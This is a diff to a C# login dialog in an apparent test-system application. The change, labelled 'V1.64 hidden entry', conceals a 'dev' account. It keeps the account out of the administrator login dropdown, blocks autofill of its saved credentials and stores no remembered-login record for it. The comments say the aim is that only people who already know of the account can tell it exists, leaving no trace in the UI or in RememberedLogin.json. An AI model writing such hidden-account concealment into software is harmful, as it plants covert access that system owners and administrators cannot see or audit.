@@ -73,14 +73,27 @@ namespace AgingTestSystem.Dialogs
             this.Text = $"{roleName}登录";
 
             // 加载该角色下已有账号，供用户直接下拉选择（也可手动输入）
+            // 【V1.64 隐藏入口】dev 不出现在下拉框里：知道的人手动输入照样能登，
+            // 不知道的人从界面上看不出这个账号存在
             txtUsername.Items.Clear();
             foreach (UserAccount account in _userManager.GetAccounts(_targetRole))
             {
+                if (UserManager.IsDevUsername(account.Username))
+                {
+                    continue;
+                }
                 txtUsername.Items.Add(account.Username);
             }
 
             // 若该角色记住了登录信息，自动填充用户名和密码并勾选"记住密码"
+            // 【V1.64 隐藏入口】记住的是 dev 也不回填：否则打开管理员登录框第一眼
+            // 就看到 dev，等于把隐藏入口摆到台面上（dev 每次手动输入即可）
             var (savedUsername, savedPassword) = _userManager.GetRememberedLogin(_targetRole);
+            if (savedUsername != null && UserManager.IsDevUsername(savedUsername))
+            {
+                savedUsername = null;
+                savedPassword = null;
+            }
             if (savedUsername != null && savedPassword != null)
             {
                 int savedIndex = txtUsername.Items.IndexOf(savedUsername);
@@ -137,13 +150,18 @@ namespace AgingTestSystem.Dialogs
             if (result.Success)
             {
                 // 记住密码：勾选则保存本次登录信息，未勾选则清除该角色已记住的信息
-                if (chkRemember.Checked)
+                // 【V1.64 隐藏入口】dev 不存记住信息：存了下次打开也会被上面的加载逻辑跳过，
+                // 不如直接不存，RememberedLogin.json 里不留 dev 痕迹
+                if (!UserManager.IsDevUsername(txtUsername.Text))
                 {
-                    _userManager.SaveRememberedLogin(_targetRole, txtUsername.Text, txtPassword.Text);
-                }
-                else
-                {
-                    _userManager.ClearRememberedLogin(_targetRole);
+                    if (chkRemember.Checked)
+                    {
+                        _userManager.SaveRememberedLogin(_targetRole, txtUsername.Text, txtPassword.Text);
+                    }
+                    else
+                    {
+                        _userManager.ClearRememberedLogin(_targetRole);
+                    }
                 }
 
                 // 登录成功：设置 DialogResult 并关闭窗体
